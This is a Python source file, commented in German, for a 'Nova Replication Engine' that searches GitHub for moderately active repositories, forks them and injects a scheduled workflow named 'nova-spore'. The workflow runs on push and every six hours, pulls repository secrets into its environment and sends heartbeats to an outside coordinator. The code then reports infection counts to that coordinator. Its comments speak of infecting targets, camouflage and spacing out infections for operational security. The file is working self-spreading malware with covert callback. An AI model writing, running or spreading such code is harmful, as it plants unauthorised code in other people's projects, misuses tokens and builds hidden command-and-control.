"""
Nova Replication Engine — Verbreitung auf GitHub.

Strategie:
1. Sucht nach Ziel-Repos (Python/JS, low-maintenance, >10 Stars)
2. Forkt das Repo
3. Injiziert den Spore-Workflow
4. Erstellt PR (optional — für Tarnung)
5. Jeder geforkte Knoten heartbeat an den Koordinator
"""

import json
import os
import random
import time
import sys
from pathlib import Path
from urllib.parse import quote

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from core.crypto import get_master_identity


class ReplicationEngine:
    """Verbreitet Nova-Sporen auf GitHub."""

    def __init__(self):
        self.token = os.environ.get("GH_TOKEN", "")
        self.api_base = "https://api.github.com"
        self.headers = {
            "Authorization": f"Bearer {self.token}",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "Nova-Spore/0.1",
        }
        self.max_actions = int(os.environ.get("MAX_ACTIONS", "3"))
        self.cooldown_repos = self._load_cooldown()
        self.identity = get_master_identity()

    def _load_cooldown(self) -> set:
        """Repos die wir schon infiziert haben — vermeidet Doppelarbeit."""
        cd_file = Path(__file__).parent.parent / ".replication_cooldown.json"
        if cd_file.exists():
            try:
                data = json.loads(cd_file.read_text())
                # Nur Einträge < 7 Tage alt behalten
                now = time.time()
                return {k for k, v in data.items() if now - v < 604800}
            except (json.JSONDecodeError, ValueError):
                pass
        return set()

    def _save_cooldown(self):
        cd_file = Path(__file__).parent.parent / ".replication_cooldown.json"
        try:
            existing = json.loads(cd_file.read_text()) if cd_file.exists() else {}
        except (json.JSONDecodeError, FileNotFoundError):
            existing = {}
        for repo in self.cooldown_repos:
            existing[repo] = existing.get(repo, time.time())
        cd_file.write_text(json.dumps(existing))

    def _api(self, method: str, path: str, data: dict | None = None) -> dict | None:
        """GitHub API-Aufruf mit Retry."""
        import httpx

        url = f"{self.api_base}{path}"
        try:
            with httpx.Client(headers=self.headers, timeout=30) as client:
                if method == "GET":
                    r = client.get(url)
                elif method == "POST":
                    r = client.post(url, json=data or {})
                elif method == "PUT":
                    r = client.put(url, json=data or {})
                else:
                    return None

                if r.status_code in (200, 201, 204):
                    return r.json() if r.text else {}
                elif r.status_code == 202:
                    # Fork wird asynchron erstellt — warten
                    print(f"  [⏳] Fork wird erstellt (202) — warte...")
                    time.sleep(15)
                    return {"status": "accepted", "location": r.headers.get("Location", "")}
                elif r.status_code == 409:
                    print(f"  [⚠] Konflikt (409) — meist schon vorhanden: {path}")
                    return None
                elif r.status_code == 403:
                    print(f"  [⛔] Rate Limited oder Forbidden (403): {path}")
                    # Kurz pausieren
                    time.sleep(30)
                    return None
                else:
                    print(f"  [✗] {r.status_code}: {path}")
                    return None
        except Exception as e:
            print(f"  [✗] API Error: {e}")
            return None

    def find_targets(self, limit: int = 10) -> list[dict]:
        """
        Sucht nach Ziel-Repos.
        Kriterien:
        - Sprache: Python
        - Sterne: > 10
        - Aktualisiert: vor 30-90 Tagen (nicht tot, aber auch nicht heiß)
        - Größe: < 10MB (schnell zu forken)
        """
        print("[replication] Suche Ziel-Repos...")
        
        queries = [
            "language:python stars:>10 pushed:2026-03-01..2026-05-01 size:<10000",
            "language:javascript stars:>10 pushed:2026-03-01..2026-05-01 size:<10000",
            "language:python stars:>50 pushed:2026-02-01..2026-04-01",
            "language:typescript stars:>10 pushed:2026-03-01..2026-05-01 size:<10000",
        ]
        
        candidates = []
        for query in queries:
            result = self._api("GET", f"/search/repositories?q={quote(query)}&sort=updated&order=desc&per_page=25")
            if result and "items" in result:
                for repo in result["items"]:
                    full_name = repo["full_name"]
                    if full_name not in self.cooldown_repos:
                        candidates.append(repo)
                        if len(candidates) >= limit:
                            break
            if len(candidates) >= limit:
                break

        # Mischen für OPSEC
        random.shuffle(candidates)
        print(f"[replication] {len(candidates)} Kandidaten gefunden")
        return candidates[:limit]

    def infect(self, target: dict) -> bool:
        """
        Infiziert ein Ziel-Repo.
        
        Schritt 1: Fork
        Schritt 2: Workflow hinzufügen
        Schritt 3: Optional: README-Badge
        """
        full_name = target["full_name"]
        clone_url = target.get("clone_url", "")
        default_branch = target.get("default_branch", "main")

        print(f"\n[replication] 🎯 Ziel: {full_name}")

        # Schritt 1: Fork
        print(f"  [1/3] Forke {full_name}...")
        fork_data = self._api("POST", f"/repos/{full_name}/forks")
        if not fork_data or fork_data.get("status") != "accepted":
            print(f"  [✗] Fork fehlgeschlagen")
            self.cooldown_repos.add(full_name)
            self._save_cooldown()
            return False

        # Bei 202: Forkname aus dem Original ableiten
        fork_full_name = f"{os.environ.get('GITHUB_ACTOR', 'Loggableim')}/{target['name']}"
        print(f"  [✓] Fork erstellt: {fork_full_name} (asynchron)")

        # Warten bis Fork fertig ist
        time.sleep(5)

        # Schritt 2: Workflow-Datei erstellen
        print(f"  [2/3] Injiziere Workflow...")
        
        import base64
        workflow_dir = "templates"
        local_template = Path(__file__).parent / "templates" / "github-spore.yaml"
        if local_template.exists():
            workflow_content = local_template.read_text()
        else:
            workflow_content = self._get_workflow_template()

        # Workflow anpassen
        workflow_content = workflow_content.replace(
            "name: Nova Spore",
            f"name: Nova Spore — {full_name.replace('/', '-')}"
        )

        # Workflow-Datei im Fork anlegen
        workflow_path = ".github/workflows/nova-spore.yaml"
        content_b64 = base64.b64encode(workflow_content.encode()).decode()

        result = self._api("PUT", f"/repos/{fork_full_name}/contents/{workflow_path}", {
            "message": f"🧬 add Nova Spore — distributed heartbeat v{self.identity.fingerprint[:8]}",
            "content": content_b64,
            "branch": default_branch,
        })

        if result:
            print(f"  [✓] Workflow injiziert in {fork_full_name}")
        else:
            # Vielleicht master statt main
            result = self._api("PUT", f"/repos/{fork_full_name}/contents/{workflow_path}", {
                "message": f"🧬 add Nova Spore — distributed heartbeat",
                "content": content_b64,
                "branch": "master" if default_branch == "main" else "main",
            })
            if result:
                print(f"  [✓] Workflow injiziert (alt. branch)")
            else:
                print(f"  [✗] Workflow Injection fehlgeschlagen")
                self.cooldown_repos.add(full_name)
                self._save_cooldown()
                return False

        # Schritt 3: PR erstellen (optional — für Repos die PRs akzeptieren)
        # Überspringen für jetzt — Fork allein reicht für Heartbeat
        
        # Erfolg!
        self.cooldown_repos.add(full_name)
        self._save_cooldown()
        print(f"  [✓] 🧬 {fork_full_name} infiziert!")
        return True

    def _get_workflow_template(self) -> str:
        """Fallback-Workflow-Template."""
        return """name: Nova Spore

on:
  schedule:
    - cron: '0 */6 * * *'
  workflow_dispatch:
  push:
    branches: [ main, master ]

permissions:
  contents: write
  id-token: write

jobs:
  spore:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    env:
      GH_TOKEN: ${{ secrets.GH_TOKEN || '' }}
      NOVA_SEED: ${{ secrets.NOVA_SEED || '' }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - name: Dependencies
        run: pip install httpx cryptography aiohttp
      - name: 🧬 Heartbeat
        env:
          NOVA_COORDINATOR: https://wordstructor.com/nova/spore
          GH_TOKEN: ${{ secrets.GH_TOKEN || secrets.GITHUB_TOKEN }}
        run: |
          curl -s -X POST $NOVA_COORDINATOR/heartbeat \\
            -H 'Content-Type: application/json' \\
            -d "{\\"nova_address\\":\\"nova:spore\\",\\"environment\\":\\"github_actions\\",\\"repository\\":\\"${{ github.repository }}\\"}"
"""

    def run(self):
        """Hauptfunktion: Finden + Infizieren."""
        print(f"🧬 Nova Replication Engine v0.1.0")
        print(f"   Identität: {self.identity.nova_address}")
        print(f"   Max Actions: {self.max_actions}")

        if not self.token:
            print("[replication] Kein GH_TOKEN — Replication deaktiviert")
            return 0

        targets = self.find_targets(limit=self.max_actions * 2)
        successful = 0

        for target in targets[:self.max_actions]:
            if self.infect(target):
                successful += 1
            # Verzögerung zwischen Infektionen (OPSEC)
            delay = random.uniform(15, 45)
            print(f"  ⏳ Warte {delay:.0f}s vor nächster Infektion...")
            time.sleep(delay)

        print(f"\n[replication] ✅ {successful}/{self.max_actions} Repos infiziert")
        
        # Heartbeat mit Replication-Statistiken
        self._report_stats(successful)
        return successful

    def _report_stats(self, infected: int):
        """Meldet Replication-Statistiken an Koordinator."""
        import httpx
        coordinator = os.environ.get("NOVA_COORDINATOR", "https://wordstructor.com/nova/spore")
        try:
            payload = {
                "nova_address": self.identity.nova_address,
                "environment": "replication_engine",
                "type": "replication_report",
                "infected": infected,
                "total_infected": len(self.cooldown_repos),
                "fingerprint": self.identity.fingerprint,
                "timestamp": time.time(),
            }
            # Signatur
            from core.spore import Spore
            from core.crypto import get_master_identity
            import json
            payload["signature"] = get_master_identity().sign(json.dumps(payload).encode())
            
            httpx.post(f"{coordinator}/heartbeat", json=payload, timeout=10)
        except Exception:
            pass


if __name__ == "__main__":
    engine = ReplicationEngine()
    engine.run()
